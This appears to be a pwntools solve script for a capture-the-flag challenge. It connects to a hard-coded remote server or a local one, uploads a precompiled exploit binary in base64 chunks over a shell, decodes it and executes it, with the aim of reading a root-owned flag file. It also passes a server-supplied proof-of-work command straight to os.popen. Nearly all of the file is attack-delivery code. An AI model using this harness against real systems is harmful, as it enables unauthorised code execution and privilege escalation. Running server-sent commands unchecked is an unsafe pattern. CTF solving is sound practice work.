#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys


hosts = ("34.91.20.14","localhost","localhost")
ports = (1337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')


## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  ## If PoW is required...
  hashcat = c.recvline().rstrip().decode('utf-8')
  print("[+] calculating PoW...")
  hash_res = os.popen(hashcat).read()
  print("[+] finished calc hash: " + hash_res)
  c.sendline(hash_res)

  # before run this script, compile/gzip/base64 the exploit.
  with open("./nirugiri.b64", 'r') as f:
    binary = f.read()
  
  progress = 0
  #N = 0x100
  N = 0x200
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  c.sendlineafter('$', 'rm /home/user/nirugiri.b64')
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter('$', 'echo -n "{}" >> /home/user/nirugiri.b64'.format(s)) # don't forget -n
    progress += N
    if progress % N == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
  c.sendlineafter('$', 'cd /home/user')
  c.sendlineafter('$', 'base64 -d nirugiri.b64 > exploit')

  c.sendlineafter('$', 'chmod +x ./exploit')
  c.sendlineafter('$', './exploit')
  #c.sendlineafter('$', 'cat /root/flag.txt')



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
